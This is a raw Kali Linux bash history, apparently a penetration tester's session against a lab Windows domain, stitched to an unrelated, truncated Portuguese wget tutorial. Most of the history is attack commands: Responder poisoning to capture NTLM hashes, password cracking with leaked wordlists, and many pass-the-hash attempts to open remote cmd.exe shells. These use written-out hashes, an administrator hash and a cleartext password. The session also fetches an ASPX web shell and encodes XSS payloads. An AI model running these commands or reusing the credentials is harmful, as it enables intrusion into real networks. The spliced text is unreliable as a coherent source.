 1539  nmblookup -U how2sec.local -R "HOW2SEC#1b"
 1540  clear
 1541  nmblookup -U how2sec.local -B
 1542  nmblookup -U how2sec.local -B 192.168.5.0
 1543  nmblookup -U how2sec.local -B 192.168.5.100
 1544  nmblookup -U how2sec.local --broadcast=192.168.5.100
 1545  nmblookup -U how2sec.local --broadcast=192.168.5.255
 1546  nmblookup -U how2sec.local --broadcast=192.168.5.255 HOW2SEC
 1547  exit
 1548  service ssh start
 1549  ifconfig
 1550  exit
 1551  cat /etc/services
 1552  cd /opt/well-tools/
 1553  ls wordlists/
 1554  clear
 1555  git clone https://github.com/m8r0wn/nullinux
 1556  ls
 1557  cd nullinux/
 1558  ls
 1559  ls ../wordlists/
 1560  cd ../wordlists/
 1561  ls
 1562  cat wordlist.txt | wc -l
 1563  cat wordlist.txt | sort -u | wc -l
 1564  cat wordlist.txt | sort -u >> wordlist2.txt
 1565  cat wordlist2.txt | sort -u | wc -l
 1566  cat wordlist2.txt > wordlist.txt
 1567  cat wordlist.txt | sort -u | wc -l
 1568  root@kali-wellx64:/opt/well-tools# git clone https://github.com/m8r0wn/nullinux
 1569  Cloning into 'nullinux'...
 1570  remote: Counting objects: 141, done.
 1571  remote: Total 141 (delta 0), reused 0 (delta 0), pack-reused 141
 1572  Receiving objects: 100% (141/141), 26.56 KiB | 0 bytes/s, done.
 1573  Resolving deltas: 100% (83/83), done.
 1574  root@kali-wellx64:/opt/well-tools# ls
 1575  nullinux  Pen-Test  Responder  SimpleHTTPServer  wordlists
 1576  root@kali-wellx64:/opt/well-tools# cd nullinux/
 1577  root@kali-wellx64:/opt/well-tools/nullinux# ls
 1578  LICENSE  nullinux.py  README.md  usage.txt
 1579  root@kali-wellx64:/opt/well-tools/nullinux# ls ../wordlists/
 1580  wordlist-leak01.txt  wordlist-leak1.txt
 1581  root@kali-wellx64:/opt/well-tools/nullinux# cd ../wordlists/
 1582  root@kali-wellx64:/opt/well-tools/wordlists# ls
 1583  wordlist-leak01.txt  wordlist-leak02.txt  wordlist.txt
 1584  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist.txt | wc -l
 1585  3632517
 1586  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist.txt | sort -u | wc -l
 1587  2514333
 1588  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist.txt | sort -u >> wordlist2.txt
 1589  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist2.txt | sort -u | wc -l
 1590  2514333
 1591  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist2.txt > wordlist.txt
 1592  root@kali-wellx64:/opt/well-tools/wordlists# cat wordlist.txt | sort -u | wc -l
 1593  2514333
 1594  nslookup _msdcs._ldap._tcp.dc.how2sec.local
 1595  ping how2sec.local
 1596  find / -name rockyou
 1597  history
 1598  host -t any _ldap._tcp.dc._msdcs.how2sec.local
 1599  ping how2sec.local
 1600  host -t any _ldap._tcp.dc._msdcs.how2sec.local
 1601  ping how2sec.local
 1602  host -t any _kerberos._tcp.dc._msdcs.how2sec.local
 1603  host -t any _ldap._tcp.dc._msdcs.how2sec.local
 1604  ping how2sec.local
 1605  clear
 1606  ping -c 1 how2sec.local
 1607  clear
 1608  host -t any _ldap._tcp.dc._msdcs.how2sec.local
 1609  host -t any _kerberos._tcp.dc._msdcs.how2sec.local
 1610  ifconfig
 1611  nmblookup -U how2sec.local -B
 1612  nmblookup -U how2sec.local -B 192.168.5.0
 1613  nmblookup -U how2sec.local -B 192.168.5.100
 1614  nmblookup -U how2sec.local --broadcast=192.168.5.100
 1615  nmblookup -U how2sec.local --broadcast=192.168.5.255 HOW2SEC
 1616  nmblookup -U how2sec.local -R --broadcast=192.168.5.255 HOW2SEC
 1617  nmblookup -U how2sec.local -M --broadcast=192.168.5.255 HOW2SEC
 1618  nmblookup -U how2sec.local -S --broadcast=192.168.5.255 HOW2SEC
 1619  nmblookup -U how2sec.local -S - d --broadcast=192.168.5.255 HOW2SEC
 1620  nmblookup -U how2sec.local -S -d --broadcast=192.168.5.255 HOW2SEC
 1621  nmblookup -U how2sec.local -S -d  HOW2SEC
 1622  nmblookup -U how2sec.local -S -A --broadcast=192.168.5.255 HOW2SEC
 1623  nmblookup -U how2sec.local -S -T --broadcast=192.168.5.255 HOW2SEC
 1624  clear
 1625  snmpwalk --help
 1626  cd
 1627  aptitude search snmputil
 1628  snmp-check
 1629  snmp-check 192.168.5.100
 1630  clear
 1631  snmp-check 192.168.5.100 | less
 1632  snmp-check --help
 1633  clear
 1634  snmp-check 192.168.5.100 > snmp_dc_win12.txt
 1635  cat snmp_dc_win12.txt
 1636  halt
 1637  msfupdate --help
 1638  msfupdate
 1639  ifconfig
 1640  dhclient eth0
 1641  exit
 1642  msfconsole
 1643  ifconfig
 1644  exit
 1645  /etc/init.d/postgresql restart
 1646  msfupdate
 1647  ls /opt/
 1648  ls /opt/well-tools/
 1649  ls /opt/well-tools/wordlists/
 1650  ls /opt/well-tools/Pen-Test/
 1651  service ssh start
 1652  cd /opt/well-tools/Responder/
 1653  ./Responder.py --version
 1654  exit
 1655  ifconfig
 1656  /etc/init.d/networking restart
 1657  ifconfig
 1658  /etc/init.d/networking restart
 1661  ifconfig
 1662  clear
 1663  msfconsole
 1664  clear
 1665  msfconsole
 1666  nmap --help
 1667  nmap --help | grep update
 1668  nmap --script-updatedb
 1669  exit
 1670  cd /opt/well-tools/
 1671  ls
 1672  git clone https://github.com/byt3bl33d3r/pth-toolkit
 1673  git clone https://github.com/hugsy/proxenet.git
 1674  cd proxenet && cmake . && make
 1675  aptitude install cmake
 1676  aptitude update
 1677  cd -
 1678  git clone https://github.com/secretsquirrel/the-backdoor-factory
 1679  aptitude install cmake
 1680  ps aux
 1681  aptitude install cmake
 1682  exit
 1683  ls
 1684  cp -r Responder tun_responder
 1685  ls
 1686  ls pth-toolkit/
 1687  ls /etc/apt/
 1688  ls /var/lib/dpkg/
 1689  cat /var/lib/dpkg/lock
 1690  cat /etc/apt/sources.list
 1691  ps aux | grep dpkg
 1692  exit
 1693  ls logs/
 1694  cat logs/SMB-NTLMv2-SSP-192.168.5.100.txt
 1695  cd ..
 1696  ls
 1697  ls tun_responder/logs/
 1698  exit
 1699  cd /opt/well-tools/Responder/
 1700  ls
 1701  ls logs/
 1702  rm logs/*
 1703  ./Responder.py -I eth0 -wrf
 1704  clear
 1705  ./Responder.py -I eth0 -wrf
 1706  ./Responder.py --help
 1707  ./Responder.py -I eth0
 1708  ./Responder.py -I eth0 -w -r -f
 1709  cd ..
 1710  rm -r Responder
 1711  history | grep git
 1712  git clone https://github.com/SpiderLabs/Responder
 1713  ls
 1714  cd Responder/
 1715  ./Responder.py -I eth0 -wrf
 1716  clear
 1717  ./Responder.py --help
 1718  ./Responder.py -I eth0 -wFr --lm
 1719  ./Responder.py -I eth0 -wb --lm
 1720  ./Responder.py -I eth0 -wbFfu --lm
 1721  ./Responder.py --help
 1722  ./Responder.py -I eth0 -wbFfu --lm
 1723  ./Responder.py -I eth0 -wbFfud --lm
 1724  ./Responder.py -I eth0 -wFr --lm
 1725  ./Responder.py -I eth0 -wFrf --lm
 1726  ls logs/
 1727  cat logs/SMB-NTLMv2-192.168.5.130.txt
 1728  exit
 1729  vi Responder.conf
 1730  exit
 1731  cat HTTP-NTLMv1-192.168.5.132.txt
 1732  cd ../../
 1733  ls
 1734  git clone https://github.com/CoreSecurity/impacket
 1735  ls
 1736  ls impacket/
 1737  exit
 1738  ls -la /usr/share/john/
 1739  exit
 1740  john --wordlist=/opt/well-tools/wordlists/rockyou.txt HTTP-NTLMv2-192.168.5.129.txt
 1741  john --wordlist=/opt/well-tools/wordlists/wordlist.txt HTTP-NTLMv2-192.168.5.129.txt
 1742  john --wordlist=/opt/well-tools/wordlists/wordlist01.txt HTTP-NTLMv2-192.168.5.129.txt
 1743  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv2-192.168.5.129.txt
 1744  john --wordlist=/opt/well-tools/wordlists/wordlist03.txt HTTP-NTLMv2-192.168.5.129.txt
 1745  john --wordlist=/opt/well-tools/wordlists/wordlist-mix.txt HTTP-NTLMv2-192.168.5.129.txt
 1746  clear
 1747  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv2-192.168.5.129.txt
 1748  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-SSP-192.168.5.129.txt
 1749  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv2-192.168.5.130.txt
 1750  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-192.168.5.130.txt
 1751  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-SSP-192.168.5.130.txt
 1752  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv1-192.168.5.132.txt
 1753  john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-192.168.5.134.txt
 1754  exit
 1755  john -h
 1756  clear
 1757  john --wordlist=/opt/well-tools/wordlists/wordlist.txt HTTP-NTLMv1-192.168.5.132.txt
 1758  clear
 1759  john --wordlist=/opt/well-tools/wordlists/wordlist1.txt HTTP-NTLMv1-192.168.5.132.txt
 1760  john --wordlist=/opt/well-tools/wordlists/rockyou HTTP-NTLMv1-192.168.5.132.txt
 1761  john --wordlist=/opt/well-tools/wordlists/rockyou.txt HTTP-NTLMv1-192.168.5.132.txt
 1762  john --wordlist=/opt/well-tools/wordlists/rockyou.txt --format=netntlm-native HTTP-NTLMv1-192.168.5.132.txt
 1763  john HTTP-NTLMv1-192.168.5.132.txt
 1764  exit
 1765  ls ../../
 1766  ls ../../wordlists/
 1767  cd ../../wordlists/
 1768  head -n3 wordlist.txt
 1769  ls -la
 1770  mv wordlist2.txt wordlist1.txt
 1771  rm wordlist.txt
 1772  clear
 1773  ls
 1774  exit
 1775  cd /opt/well-tools/Responder/
 1776  clear
 1777  ./Responder.py -I eth0 -wrf
 1778  clear
 1779  ls logs/
 1780  clear
 1781  ls -l logs/
 1782  cat logs/HTTP-NTLMv2-192.168.5.129.txt
 1783  service ssh start
 1784  clear
 1785  cd logs/
 1786  ls
 1787  exit
 1788  service ssh start
 1789  ifconfig
 1790  exit
 1791  clear
 1792  pth-winexe -U maloy.03%1122334455667788:7785BF1C5B172B87E8A6D8AFEEFD5449 //192.168.5.130 ipconfig
 1793  pth-winexe -h
 1794  pth-winexe -U HOW2SEC/maloy.03%1122334455667788:7785BF1C5B172B87E8A6D8AFEEFD5449 //192.168.5.130 ipconfig
 1795  pth-winexe -U HOW2SEC/maloy.03%7785BF1C5B172B87E8A6D8AFEEFD5449 //192.168.5.130 ipconfig
 1796  pth-winexe -U HOW2SEC/maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 ipconfig
 1797  winexe -U HOW2SEC/maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 ipconfig
 1798  winexe -U HOW2SEC/maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1799  pth-winexe -U HOW2SEC/maloy.03%7785BF1C5B172B87E8A6D8AFEEFD5449 //192.168.5.130 cmd.exe
 1800  winexe -U HOW2SEC/maloy.03%F1D623AC685225E85A49F5FBAA6F7229 //192.168.5.130 cmd.exe
 1801  winexe -U HOW2SEC/maloy.03%F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1802  winexe -U maloy.03%F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1803  winexe -U maloy.03%F1D623AC685225E85A49F5FBAA6F7229 //192.168.5.130 cmd.exe
 1804  winexe -U how2sec/maloy.03%F1D623AC685225E85A49F5FBAA6F7229 //192.168.5.130 cmd.exe
 1805  winexe -U how2sec\maloy.03%F1D623AC685225E85A49F5FBAA6F7229 //192.168.5.130 cmd.exe
 1806  winexe -U welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1807  winexe -U winxp\welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1808  winexe -U winxp/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1809  winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1810  winexe -U how2sec\welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1811  winexe -U how2sec\welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1812  winexe -U how2sec\welltom%2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1813  clear
 1814  cat /opt/well-tools/Responder/logs/SMB-NTLMv2-192.168.5.130.txt
 1815  winexe -U how2sec/maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1816  winexe -U how2sec\maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1817  pth-winexe -U how2sec\maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1818  pth-winexe -U how2sec/maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1819  pth-winexe -U maloy.03%1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1820  pth-winexe -h
 1821  pth-winexe -A /opt/well-tools/Responder/logs/SMB-NTLMv2-192.168.5.130.txt //192.168.5.130 cmd.exe
 1822  cat /opt/well-tools/Responder/logs/SMB-NTLMv2-192.168.5.130.txt
 1823  pth-winexe -U how2sec/maloy.03%F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000 //192.168.5.130 cmd.exe
 1824  cat /opt/well-tools/Responder/logs/HTTP-NTLMv2-192.168.5.130.txt
 1825  cat /opt/well-tools/Responder/logs/HTTP-NTLMv1-192.168.5.132.txt
 1826  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1827  pth-winexe -U winxp/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1828  pth-winexe -U winxp/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1829  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1830  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1831  clear
 1832  winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1833  winexe -U winxp/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.132 cmd.exe
 1834  winexe -U winxp/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1835  winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1836  winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.130 cmd.exe
 1837  winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.130 cmd.exe
 1838  winexe -U HOW2SEC/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.130 cmd.exe
 1839  winexe -U HOW2SEC/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.130 cmd.exe
 1840  cat /opt/well-tools/Responder/logs/HTTP-NTLMv1-192.168.5.132.txt
 1841  winexe -U HOW2SEC/welltom%2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.130 cmd.exe
 1842  winexe -U HOW2SEC/welltom%2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1843  winexe -U WINXP/welltom%2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.132 cmd.exe
 1844  winexe -U WINXP/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.132 cmd.exe
 1845  winexe -U WINXP/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.132 -c cmd.exe
 1846  winexe -d 9 -U WINXP/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.132 -c cmd.exe
 1847  pth-winexe -U WINXP/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.132 -c cmd.exe
 1848  pth-winexe -U WINXP/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.132 cmd.exe
 1849  pth-winexe -U how2sec/welltom%P@ssw0rd01 //192.168.5.132 cmd.exe
 1850  pth-winexe -U how2sec\welltom%P@ssw0rd01 //192.168.5.132 cmd.exe
 1851  pth-winexe -U how2sec/welltom%P@ssw0rd01 //192.168.5.132 cmd.exe
 1852  pth-winexe -U how2sec/welltom%P@ssw0rd01 //192.168.5.130 cmd.exe
 1853  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000 //192.168.5.130 cmd.exe
 1854  cat /opt/well-tools/Responder/logs/HTTP-NTLMv1-192.168.5.132.txt
 1855  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.130 cmd.exe
 1856  pth-winexe -U how2sec/welltom%2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095 //192.168.5.130 cmd.exe
 1857  pth-winexe -U how2sec/welltom%536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788 //192.168.5.130 cmd.exe
 1858  cd /opt/well-tools/Responder/
 1859  ./Responder.py -I 192.168.5.131 --lm
 1860  ./Responder.py -I eth0 --lm
 1861  ls logs/
 1862  exit
 1863  pth-winexe -U winxp/administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.130 cmd.exe
 1864  pth-winexe -U winxp/administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1865  pth-winexe -U administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1866  nc -v 192.168.5.132 445
 1867  nc -v 192.168.5.132 139
 1868  winexe -U administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1869  ping 192.168.5.132
 1870  winexe -U Administrator:500:4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 cmd.exe
 1871  winexe -U Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 cmd.exe
 1872  winexe -U winxp\Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 cmd.exe
 1873  winexe -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 cmd.exe
 1874  winexe -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 -c cmd.exe
 1875  winexe -U winxp/Administrator%90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1876  winexe -U Administrator%90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1877  winexe -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: -d //192.168.5.132 cmd.exe
 1878  winexe -d -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D::: //192.168.5.132 cmd.exe
 1879  winexe -d -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1880  winexe -d 1 -U winxp/Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.132 cmd.exe
 1881  winexe -d 1 -U Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.130 cmd.exe
 1882  winexe -U Administrator%4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D //192.168.5.130 cmd.exe
 1883  winexe -U Administrator%90370BB6D0C156B54581E89BEBE26E7D //192.168.5.130 cmd.exe
 1884  winexe -U Administrator%25accfc9cdecc45a3029075fc13afc36 //192.168.5.130 cmd.exe
 1885  winexe -U how2sec/welltom%25accfc9cdecc45a3029075fc13afc36 //192.168.5.130 cmd.exe
 1886  winexe -U how2sec/welltom%25accfc9cdecc45a3029075fc13afc36 //192.168.5.132 cmd.exe
 1887  winexe -U HOW2SEC/welltom%25accfc9cdecc45a3029075fc13afc36 //192.168.5.132 cmd.exe
 1888  winexe -U HOW2SEC/welltom%921988ba001dc8e1c295285c92cd06b4 //192.168.5.132 cmd.exe
 1889  pth-winexe -U HOW2SEC/welltom%921988ba001dc8e1c295285c92cd06b4 //192.168.5.132 cmd.exe
 1890  pth-net
 1891  pth-net -h
 1892  pth-net net dom -U welltom%25accfc9cdecc45a3029075fc13afc36 -W how2sec setauthuser
 1893  service ssh start
 1894  ifconfig
 1895  exit
 1896  passwd root
 1897  exit
 1898  ls /opt/
 1899  ls /opt/well-tools/
 1900  aptitude update
 1901  ifconfig
 1902  dhclient eth0
 1903  /etc/init.d/networking restart
 1904  ifconfig
 1905  ping www.google.com
 1906  clear
 1907  aptitude update
 1908  aptitude upgrade
 1909  reboot re
 1910  msfconsole
 1911  exit
 1912  netstat -atun
 1913  /etc/init.d/postgresql start
 1914  netstat -atun
 1915  aptitude install build-essential linux-headers-`uname -r`
 1916  exit
 1917  cd /opt/well-tools/
 1918  ls
 1919  ls build/
 1920  clear
 1921  ls
 1922  ls pth-toolkit/
 1923  ls ../../root/devel/
 1924  ls ../../root/devel/convert/
 1925  cp /root/devel/convert .
 1926  cp -r /root/devel/convert .
 1927  ls
 1928  cd convert
 1929  ls
 1930  ./how2encode.py
 1931  ./how2encode.py --help
 1932  vi how2encode.py
 1933  clear
 1934  python how2encode.py -t http --str"<script>alert(123)</script>"
 1935  python how2encode.py -t hex --str"<script>alert(123)</script>"
 1936  python how2encode.py -t hex --str="<script>alert(123)</script>"
 1937  clear
 1938  vi lib-conv/hex_url.py
 1939  cp lib-conv/hex_url.py lib-conv/hex_js.py
 1940  vi lib-conv/hex_js.py
 1941  vi how2encode.py
 1942  python how2encode.py -t full --str="<script>alert(123)</script>"
 1943  vi how2encode.py
 1944  python how2encode.py -t full --str="<script>alert(123)</script>"
 1945  vi how2encode.py
 1946  python how2encode.py -t full --str="<script>alert(123)</script>"
 1947  vi how2encode.py
 1948  python how2encode.py -t full --str="<script>alert(123)</script>"
 1949  vi how2encode.py
 1950  python how2encode.py -t full --str="<script>alert(123)</script>"
 1951  vi how2encode.py
 1952  clear
 1953  python how2encode.py -t full --str="<script>alert(123)</script>"
 1954  python how2encode.py -t full --str="<script> alert(123) </script>"
 1955  ls
 1956  python how2decode-js.py --str="&lt;script&gt;&nbsp;alert&lpar;123&rpar;&nbsp;&lt;&sol;script&gt;"
 1957  mv how2decode-js.py how2decode-html.py
 1958  vi how2decode-html.py
 1959  mv how2decode-js.py how2decode-html.py
 1960  python how2decode-html.py --str="&lt;script&gt;&nbsp;alert&lpar;123&rpar;&nbsp;&lt;&sol;script&gt;"
 1961  clear
 1962  python how2encode.py -t full --str="<script> alert(123) </script>"
 1963  python how2decode-html.py --str="&lt;script&gt;&nbsp;alert&lpar;123&rpar;&nbsp;&lt;&sol;script&gt;"
 1964  vi how2decode-html.py
 1965  python how2decode-html.py --str="&lt;script&gt;&nbsp;alert&lpar;123&rpar;&nbsp;&lt;&sol;script&gt;"
 1966  cp how2decode-html.py how2decode-url.py
 1967  vi how2decode-url.py
 1968  python how2encode.py -t full --str="<script> alert(123) </script>"
 1969  python how2decode-url.py --str="3cscript%3e%20alert%28123%29%20%3c%2fscript%3e"
 1970  python how2decode-url.py --str="%3cscript%3e%20alert%28123%29%20%3c%2fscript%3e"
 1971  ls
 1972  vi how2decode-brute-force.py
 1973  python how2decode-brute-force.py --str="%3cscript%3e%20alert%28123%29%20%3c%2fscript%3e"
 1974  python how2decode-brute-force.py --str="&lt;script&gt;&nbsp;alert&lpar;123&rpar;&nbsp;&lt;&sol;script&gt;"
 1975  python how2encode.py -t full --str="<script> alert(123) </script>"
 1976  exit
 1977  vi lib-conv/js_esc.py
 1978  mv lib-conv/js_esc.py lib-conv/html_enc.py
 1979  rm lib-conv/js_esc.pyc
 1980  vi lib-conv/html_enc.py
 1981  ls -la lib-conv/
 1982  vi lib-conv/html_enc.py
 1983  mv lib-conv/hex_js.py lib-conv/url_enc.py
 1984  vi lib-conv/url_enc.py
 1985  vi lib-conv/html_enc.py
 1986  vi lib-conv/url_enc.py
 1987  vi lib-conv/html_enc.py
 1988  exit
 1989  cd Desktop/
 1990  wget -c http://dl.finebook.ir/book/62/12382.pdf
 1991  wget -c https://dl.packetstormsecurity.net/UNIX/penetration/aspxshell.aspx.txt
 1992  cat aspxshell.aspx.txt
 1993  clear
 1994  ls
 1995  exit
 1996  openssl s_client -connect www.microsoft.com:443
 1997  ifconfig
 1998  dhclient eth0
 1999  reboot
 2000  cd devel/convert/
 2001  ls
 2002  cd ..
 2003  ls
 2004  mkdir livro_pentest
 2005  cd /opt/well-tools/Responder/
 2006  ls
 2007  ./Responder.py -i eth0 --lm
 2008  ./Responder.py -I eth0 --lm
 2009  ./Responder.py -I eth0 -brw --lm
 2010  python3
 2011  cd logs/
 2012  ls
 2013  cat HTTP-Basic-ClearText-192.168.5.132.txt
 2014  cat HTTP-NTLMv1-192.168.5.132.txt
 2015  pip install pysmb
 2016  ls
 2017  which php-winexec
 2018  which pth-winexec
 2019  which pth-winexe
 2020  file `which pth-winexe
 2021  file `which pth-winexe`
 2022  vi /usr/bin/pth-winexe
 2023  vi /usr/bin/winexe
 2024  history
root@kali-wellx64:/opt/well-tools/Responder/logs#




-=-=-=-=-=-


WGET


O comando wget em 10 exemplos

O wget é a melhor opção para fazer download de arquivos, quase sempre, em função de sua flexibilidade e agilidade. É um dos meus aplicativos preferidos, por tornar simples várias situações complexas.

    baixar arquivos grandes;
    baixar vários arquivos recursivamente;
    baixar arquivos sem minha interação;
    baixar uma grande quantidade de arquivos etc.

    LEIA MAIS

        Gostou do wget? Então conheça o wput! — para fazer uploads e enviar rápido seus arquivos pra outra máquina.
        Se você não usa Linux, baixe a versão do wget para Windows
        Conheça o comando tar em 9 exemplos
        Conheça outros comandos básicos Linux

Vou mostrar, neste artigo, o meu jeito preferido de baixar arquivos via wget.
Download de um simples arquivo

Veja como baixar o Ubuntu 14.04 64 bits via wget:

wget http://releases.ubuntu.com/trusty/ubuntu-14.04-desktop-amd64.iso

Note que, enquanto baixa o arquivo, o wget exibe algumas informações:

    o percentual de download já completado;
    a quantidade de bytes baixados;
    a velocidade de download atual;
    o tempo restante para completar a tarefa.

Neste caso, especificamente, não costumo usar o wget. Creio que torrents ainda são a forma mais eficiente de baixar a minha distro preferida.
